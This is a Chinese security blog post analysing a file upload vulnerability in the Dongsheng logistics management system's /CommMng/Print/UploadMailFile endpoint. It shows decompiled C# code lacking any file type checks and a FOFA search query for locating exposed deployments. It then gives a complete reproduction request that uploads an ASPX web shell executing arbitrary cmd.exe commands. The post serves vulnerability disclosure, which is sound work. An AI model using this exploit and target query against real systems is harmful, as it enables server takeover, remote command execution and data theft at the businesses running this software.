---
title: "东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞"
source: https://mrxn.net/jswz/dongsheng-CommMng-Print-UploadMailFile-RCE.html
asset_dir: assets/东胜物流-commmngprintuploadmailfile-文件上传漏洞
---

# 东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/10 08:31
- 296浏览
- [0评论](#comment)
- 52分钟阅读

深入探索

安全研究工具

在线安全工具

编码转换工具

---

# 漏洞简介

东胜物流是一款专为物流企业设计的管理系统，提供多种功能以支持物流企业的日常运营。东胜物流系统中的 /CommMng/Print/UploadMailFile 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可以通过该接口上传恶意文件，可能导致服务器被控制或任意[代码执行](https://mrxn.net/tag/rce)，对系统构成严重的安全威胁。

漏洞扫描服务

# 影响版本

# fofa语法

> (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"

# 漏洞分析

根据.NET MVC框架特点找到DSWeb.CommMng中对于路由的定义

```
using System.Web.Mvc;

#nullable disable
namespace DSWeb.Areas.CommMng;

public class CommMngAreaRegistration : AreaRegistration
{
  public override string AreaName => "CommMng";

  public override void RegisterArea(AreaRegistrationContext context)
  {
    context.MapRoute("CommMng_default", "CommMng/{controller}/{action}/{id}", (object) new
    {
      action = "Index",
      id = UrlParameter.Optional
    });
  }
}
```

在DSWeb.CommMng.Controllers下找到**PrintController**里的**UploadMailFile()**方法

```
[HttpPost]
public ContentResult UploadMailFile()
{
  JsonResponse jsonResponse = new JsonResponse()
  {
    Success = false,
    Message = ""
  };
  if (((NameObjectCollectionBase) this.Request.Files).Count != 1)
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "请选择上传的文件";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
  HttpPostedFileBase file = this.Request.Files["LoadFile"];
  if (file == null)
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "上传文件发生未知错误，请重新上传";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
  string str1 = this.Server.MapPath("../../UploadFiles/MailFile");
  if (!Directory.Exists(str1))
    Directory.CreateDirectory(str1);
  int contentLength = file.ContentLength;
  string fileName = Path.GetFileName(file.FileName);
  string str2 = this.Request.Form["bsno"];
  string cookieUserCode = CookieConfig.GetCookie_UserCode(this.Request);
  string str3 = $"{str1}\\{cookieUserCode}{DateTime.Now.ToString("yyyyMMddHHmmssfff")}{fileName}";
  if (System.IO.File.Exists(str3))
    System.IO.File.Delete(str3);
  file.SaveAs(str3);
  if (!System.IO.File.Exists(str3))
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "上传文件出错";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
  string str4 = "../../UploadFiles/MailFile/" + Path.GetFileName(str3);
  try
  {
    string str5 = JsonConvert.Serialize(new
    {
      success = true,
      Message = "上传成功",
      data = str4
    });
    return new ContentResult() { Content = str5 };
  }
  catch (Exception ex)
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "上传文件出错";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
}
```

注意其中关键部分

计算机服务器

```
┌─────────────────────────────────────────────────────────────┐
│                    攻击者上传 shell.aspx                      │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  Request.Files["LoadFile"] 获取文件                         │
│  ✗ 未检查扩展名 (.aspx 直接通过)                             │
│  ✗ 未检查 MIME 类型                                         │
│  ✗ 未检查文件内容                                            │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  file.SaveAs() 保存到 /UploadFiles/MailFile/xxx.aspx        │
│  返回相对路径给攻击者                                        │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  攻击者访问 /UploadFiles/MailFile/xxx.aspx?cmd=whoami       │
│  → 服务器执行命令，返回结果                                   │
│  → 获取服务器完全控制权                                       │
└─────────────────────────────────────────────────────────────┘
```

1. `cookieUserCode` **可控性**：如果 `CookieConfig.GetCookie_UserCode` 未对返回值进行校验，且 Cookie 值可被伪造
2. **未过滤路径字符**：如果 `cookieUserCode` 可包含 `..\\` 或 `..//`，则可突破目标目录
3. **无扩展名验证**：代码未对[上传文件](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)的扩展名进行任何白名单或黑名单检查
4. **保存路径可知**：上传成功后直接返回文件相对路径 `str4`
5. **存放于 Web 可访问目录**：`../../UploadFiles/MailFile` WEB根目录下

# 漏洞复现

```
POST /CommMng/Print/UploadMailFile HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: multipart/form-data; boundary=----Boundary123

------Boundary123
Content-Disposition: form-data; name="LoadFile"; filename="shell.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
    string c = Request["cmd"];
    if(c != null){
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
------Boundary123--
```

[![东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞](images/img-001-d3120032964a.webp)](https://image.mrxn.net/e7537cb977004bbeb83eecabe4993e48.webp)

响应回显文件路径即可执行命令

文件大小转换

[![东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞](images/img-002-003cf2fa1b46.webp)](https://image.mrxn.net/f10ef9d65d1048e7ad82df227b2a685a.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

文件大小转换
